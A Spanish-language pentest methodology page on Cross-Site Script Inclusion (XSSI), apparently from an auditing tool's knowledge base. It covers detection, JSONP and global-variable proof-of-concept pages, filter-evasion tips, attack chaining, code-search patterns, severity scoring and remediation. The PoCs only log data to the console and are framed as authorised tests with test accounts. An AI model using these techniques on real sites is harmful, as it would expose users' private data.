# Inclusión de scripts entre sitios (Cross-Site Script Inclusion, XSSI)

| Clasificación | |
|---|---|
| CWE | CWE-200 — Exposure of Sensitive Information to an Unauthorized Actor (también CWE-346 — Origin Validation Error) |
| OWASP Top 10:2025 | A01 — Broken Access Control |
| OWASP API Top 10:2023 | API3 — Broken Object Property Level Authorization (cuando el recurso expone datos de más) |
| WSTG | WSTG-CLNT-13 |

**Contenido:** 1. Qué es · 2. Dónde buscar · 3. Detección segura · 4. Explotación (JSONP, JavaScript dinámico, variables globales, errores, técnicas históricas) · 5. Evasión · 6. Escalada · 7. Caja blanca · 8. Falsos positivos · 9. Evidencia · 10. Severidad · 11. Remediación · 12. Herramientas · 13. Referencias

---

## 1. Qué es y por qué ocurre

La política del mismo origen impide que una web lea las respuestas de otra, pero tiene una excepción histórica: **una página puede cargar y ejecutar scripts de cualquier origen** con `<script src="…">`. Si un recurso que el navegador puede ejecutar como JavaScript contiene datos privados del usuario, y el servidor los entrega usando las cookies del navegador, una página del atacante lo incluye con un `<script>`, lo ejecuta y captura esos datos. Es la XSSI.

A diferencia del XSS, el atacante **no inyecta código** en la aplicación: aprovecha que la aplicación sirve datos sensibles en un formato ejecutable. Se parece al CSRF en que la petición sale del navegador de la víctima con su sesión, pero aquí lo que se busca es **leer** la respuesta.

Condición moderna imprescindible: el navegador tiene que **enviar las credenciales** en esa petición entre sitios. Con cookies `SameSite=Lax` (el valor por defecto de Chromium) o `Strict`, un `<script src>` desde otro sitio **no lleva la cookie**. Por eso hoy la XSSI aparece sobre todo con:

- Cookies con `SameSite=None`, frecuentes en SSO, widgets embebidos y aplicaciones repartidas en varios dominios.
- Peticiones desde un **subdominio hermano** (mismo *site*): SameSite no protege entre `evil.cliente.com` y `app.cliente.com`.
- Autenticación que no depende de cookies: IP de intranet, certificados de cliente, Kerberos/NTLM integrado o HTTP Basic en caché.

## 2. Dónde buscar (señales del reconocimiento)

- Respuestas con `Content-Type: application/javascript` o `text/javascript` que cambian según el usuario: `/config.js`, `/user.js`, `/api/me.js`, `/i18n/user-<id>.js`.
- **JSONP**: parámetros `callback`, `cb`, `jsonp`, `jsoncallback`, `json_callback`, `_callback`. La respuesta tiene la forma `nombre({...})`.
- JavaScript generado en el servidor que incrusta datos del usuario: `var currentUser = {...}`, `window.__INITIAL_STATE__ = {...}` servido como fichero `.js` independiente, no dentro del HTML.
- Endpoints antiguos o de compatibilidad (APIs v1, widgets de terceros, integraciones con mapas o con analítica).
- Cookies de sesión con `SameSite=None` (ver `vulns/session.md`) o aplicaciones que comparten sesión entre subdominios.
- Respuestas JSON servidas **sin** `X-Content-Type-Options: nosniff` o con un `Content-Type` incorrecto (`text/html`, `text/plain`).

## 3. Detección segura (primeras sondas, no destructivas)

1. **¿La respuesta es ejecutable y depende del usuario?** Pide el recurso con la cuenta A y con la cuenta B (o sin sesión) y compara. Si el contenido cambia y es JavaScript válido, es candidato.

```bash
corvus.py http <eng> GET "https://app.cliente.com/api/me.js" -H "Cookie: session=<A>" --clase xssi --nota "con sesión A" --save F-xxx-xssi-a
corvus.py http <eng> GET "https://app.cliente.com/api/me.js" --clase xssi --nota "sin sesión (control)" --save F-xxx-xssi-anon
```

2. **¿Hay JSONP?** Añade un parámetro de *callback* a los endpoints JSON y mira si la respuesta lo envuelve:

```bash
for p in callback cb jsonp jsoncallback json_callback _callback; do
  corvus.py http <eng> GET "https://app.cliente.com/api/profile?$p=corvusCb" --clase xssi --nota "sonda JSONP $p" --max 80
done
# Señal: la respuesta empieza por  corvusCb({ ... })  o  /**/corvusCb(...)
```

3. **¿Viajan las credenciales entre sitios?** Revisa el atributo `SameSite` de la cookie de sesión y si la aplicación acepta autenticación ambiental (IP, certificados, NTLM). Sin credenciales entre sitios no hay XSSI explotable desde un dominio ajeno (ver §8), aunque sí puede haberla desde un subdominio comprometido.

4. **¿El navegador lo ejecutará?** Con `X-Content-Type-Options: nosniff` y un `Content-Type` JSON, el navegador se niega a ejecutar la respuesta como script, y el bloqueo ORB/CORB de los navegadores modernos impide además leerla. En ese caso solo quedan expuestos los recursos que ya son JavaScript o JSONP.

## 4. Explotación por contexto o tecnología

Todas las PoC se alojan en un origen controlado por el auditor y se prueban con **una cuenta de prueba como víctima**. El marcador de la exfiltración se muestra en la consola; no se envían datos a terceros.

### 4.1 JSONP

La forma más directa: el atacante define la función y el servidor la llama con los datos.

```html
<!-- Página del auditor: https://auditor.example/xssi-jsonp.html -->
<script>
  function corvusCb(data) {
    console.log('CORVUS-XSSI', JSON.stringify(data).slice(0, 200));
  }
</script>
<script src="https://app.cliente.com/api/profile?callback=corvusCb"></script>
```

Variantes cuando el nombre de la función está filtrado: prueba con `callback=window.corvusCb`, con `callback=alert` (solo para confirmar que ejecuta) o con nombres que incluyan puntos o corchetes si el filtro lo permite. Si el *callback* admite caracteres arbitrarios, además de XSSI tienes un **XSS o un bypass de CSP** (el endpoint JSONP sirve como *gadget* para `script-src`; ver `vulns/xss.md` §5.1).

### 4.2 JavaScript dinámico con variables globales

Si el recurso declara variables globales con datos del usuario, basta con incluirlo y leerlas:

```html
<script src="https://app.cliente.com/static/user-config.js"></script>
<script>
  // Si el recurso hace:  var currentUser = {"email":"...","apiKey":"..."}
  console.log('CORVUS-XSSI', typeof currentUser !== 'undefined' ? JSON.stringify(currentUser).slice(0, 200) : 'sin variable');
</script>
```

Si los datos se asignan a propiedades de un objeto global existente (`window.APP.user = {...}`), crea ese objeto antes de incluir el script, o define un *setter* para interceptar la asignación:

```html
<script>
  window.APP = {};
  Object.defineProperty(window.APP, 'user', { set(v) { console.log('CORVUS-XSSI', JSON.stringify(v)); } });
</script>
<script src="https://app.cliente.com/static/bootstrap.js"></script>
```

### 4.3 Funciones del propio script que reciben datos

Si el recurso llama a una función global con los datos (`init({...})`, `App.load({...})`), defínela antes de incluirlo, igual que en JSONP.

### 4.4 Fugas por mensajes de error

Desde otro origen, `window.onerror` solo recibe «Script error.» sin detalles, salvo que el recurso se sirva con `crossorigin` y CORS. Aun así, algunos navegadores antiguos y algunas configuraciones filtraban fragmentos de la respuesta en el mensaje de error. Trátalo como un vector **histórico**: compruébalo, pero no lo cuentes como hallazgo sin una fuga reproducible en un navegador actual.

### 4.5 Técnicas históricas (para reconocerlas, no para esperarlas)

- **Sobrescribir el constructor de `Array`** o los *setters* de `Object.prototype` para leer JSON con forma de array. Los navegadores modernos lo impiden.
- **UTF-7 o UTF-16 con BOM** para que una respuesta JSON se interprete como JavaScript. Los navegadores actuales ya no admiten UTF-7.
- **JSON con forma de array en la raíz** (`[{...}]`) como respuesta a GET. Hoy solo es un riesgo si se cumple todo lo anterior en un navegador obsoleto.

Si el cliente tiene usuarios con navegadores antiguos obligatorios (aplicaciones internas o terminales embebidos), estas técnicas vuelven a ser relevantes. Pruébalas con ese navegador concreto.

## 5. Evasión de filtros y WAF

- Nombres de parámetro alternativos para JSONP (§3) y en mayúsculas (`Callback`, `JSONP`).
- Si el *callback* solo admite `[A-Za-z0-9_.]`, usa una ruta a una función existente: `callback=console.log` (sirve para confirmar la ejecución) o un objeto que controles previamente (`window.corvus.cb`).
- Algunos frameworks añaden un prefijo de protección (`)]}',`, `while(1);`, `for(;;);`, `/**/`). Comprueba que esté presente en **todos** los endpoints y versiones (`/api/v1/` frente a `/api/v2/`, `?format=js`).
- Si la cookie es `SameSite=Lax`, busca un **subdominio del mismo site** en alcance con XSS o con subida de HTML (ver `vulns/file-upload.md`): desde ahí la inclusión sí lleva la cookie.

## 6. Escalada y encadenamiento (demostrar impacto máximo sin causar daño)

| Cadena | Resultado |
|---|---|
| XSSI que expone un token CSRF o una clave de API | CSRF o llamadas a la API como la víctima |
| JSONP con *callback* libre | XSS reflejado y *gadget* para saltarse una CSP basada en listas de dominios |
| XSSI en un subdominio hermano con XSS | Lectura de datos del dominio principal pese a `SameSite=Lax` |
| XSSI que expone el correo o el ID interno | Enumeración dirigida para IDOR (`vulns/access-control-idor.md`) |

Demuestra el impacto con **tu cuenta de prueba como víctima**: abre la PoC en un navegador con su sesión iniciada y captura el marcador de la consola con un fragmento del dato (tachado si es un secreto).

## 7. Caja blanca: fuentes, sumideros y patrones de código

| Pila | Vulnerable | Seguro |
|---|---|---|
| Node/Express | `res.jsonp(datosUsuario)` | `res.json(...)` + CORS restrictivo; sin JSONP |
| PHP | `echo $_GET['callback'] . '(' . json_encode($user) . ')';` | Eliminar JSONP; `header('Content-Type: application/json'); header('X-Content-Type-Options: nosniff');` |
| Python/Flask | `return f"{request.args['cb']}({json.dumps(u)})", 200, {'Content-Type': 'application/javascript'}` | `jsonify(u)` con `nosniff` |
| Java/Spring | Vistas o *advices* que devuelven JSONP (soporte retirado en las versiones modernas de Spring, pero presente en código antiguo) | `ResponseEntity<Dto>` con JSON y CORS configurado |
| Plantillas | Ficheros `.js` generados con datos de sesión (`user-config.js.erb`, `config.js.php`) | Datos de usuario solo por `fetch()` con credenciales y CORS restrictivo |

```bash
rg -n --hidden -S "jsonp\(|callback\s*\+\s*['\"]\(|\[['\"]callback['\"]\]|jsoncallback" .
rg -n -S "application/(x-)?javascript" --glob '!**/node_modules/**' .
rg -n -S "SameSite\s*=\s*None|sameSite:\s*['\"]none" .
```

```yaml
rules:
  - id: corvus-express-jsonp
    languages: [javascript, typescript]
    severity: WARNING
    message: JSONP con datos de respuesta: posible XSSI. Usa JSON + CORS.
    pattern: $RES.jsonp(...)
```

## 8. Falsos positivos frecuentes

| Patrón | Por qué no es explotable |
|---|---|
| Recurso JS que solo contiene datos públicos o constantes | No hay nada privado que leer |
| Cookie de sesión `SameSite=Lax/Strict` y sin autenticación ambiental | La inclusión desde otro sitio llega sin sesión. Comprueba aun así los subdominios hermanos |
| JSON servido con `Content-Type` JSON y `nosniff` | El navegador no lo ejecuta como script y ORB/CORB bloquea la respuesta |
| Respuesta con prefijo anti-XSSI (`)]}',`, `while(1);`) | El script falla antes de exponer los datos |
| La «fuga» solo se ve con el navegador del auditor ya autenticado en el mismo origen | Hay que demostrarla desde un origen distinto |
| Técnicas de UTF-7 o del constructor `Array` | No funcionan en navegadores actuales |

## 9. Evidencia mínima para validarlo

- Petición y respuesta del recurso **con** la sesión de la víctima de prueba y **sin** sesión (control), con la identidad del token o cookie anotada.
- Atributos de la cookie de sesión (`Set-Cookie` con `SameSite`) o justificación de la autenticación ambiental.
- La página PoC del auditor y la salida de la consola desde **un origen distinto**, en un navegador actual con perfil limpio, mostrando el marcador `CORVUS-XSSI` y un fragmento del dato.

## 10. Severidad orientativa (vectores CVSS 3.1 y 4.0 típicos según impacto demostrado)

| Caso | CVSS 3.1 | Puntuación |
|---|---|---|
| Fuga de datos personales o de un token de la víctima (requiere que visite la página) | `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N` | 6.5 |
| Fuga de datos de baja sensibilidad | `AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N` | 4.3 |
| Solo explotable desde un subdominio con XSS (condición previa) | `AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N` | 5.3 |

CVSS 4.0 de referencia: `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N` (calcula la puntuación en la calculadora de FIRST).

## 11. Remediación (con ejemplo de código correcto)

1. **Eliminar JSONP** y servir los datos como JSON, leídos con `fetch()` y protegidos con CORS restrictivo.
2. **No incrustar datos de usuario en ficheros `.js`** independientes; si hace falta estado inicial, incrústalo en el HTML de la propia página o pídelo por API.
3. **Cookies `SameSite=Lax` o `Strict`** para la sesión, salvo necesidad justificada.
4. **`Content-Type` correcto + `X-Content-Type-Options: nosniff`** en todas las respuestas JSON.
5. **Prefijo anti-XSSI** en APIs JSON antiguas que no puedas migrar (y quitarlo en el cliente antes de `JSON.parse`).

```js
// Express: sustituir JSONP por JSON + CORS restringido
const cors = require('cors');
app.get('/api/profile', cors({ origin: 'https://app.cliente.com', credentials: true }), (req, res) => {
  res.set('X-Content-Type-Options', 'nosniff');
  res.json(publicProfile(req.user));            // nunca res.jsonp(...)
});
```

## 12. Herramientas (comando y cuándo usarla)

| Herramienta | Uso |
|---|---|
| `corvus.py http` | Comparar el recurso con sesión y sin ella; sondas de `callback` |
| Burp Suite (escáner y extensión *DetectDynamicJS*) | Detectar JavaScript que cambia con la sesión. Confirmar siempre a mano |
| Navegador integrado o Chrome headless con perfil limpio | Ejecutar la PoC desde otro origen y capturar la consola |
| `rg` / Semgrep | Localizar JSONP y ficheros `.js` dinámicos en el código (§7) |

## 13. Referencias

- OWASP WSTG — WSTG-CLNT-13 *Testing for Cross Site Script Inclusion*.
- Sebastian Lekies et al., «The Unexpected Dangers of Dynamic JavaScript» (USENIX Security 2015).
- MDN — `SameSite` cookies y `X-Content-Type-Options`.
- Chromium — Opaque Response Blocking (ORB) y Cross-Origin Read Blocking (CORB).
- Relacionadas: `vulns/cors.md`, `vulns/csrf.md`, `vulns/session.md`, `vulns/xss.md`.
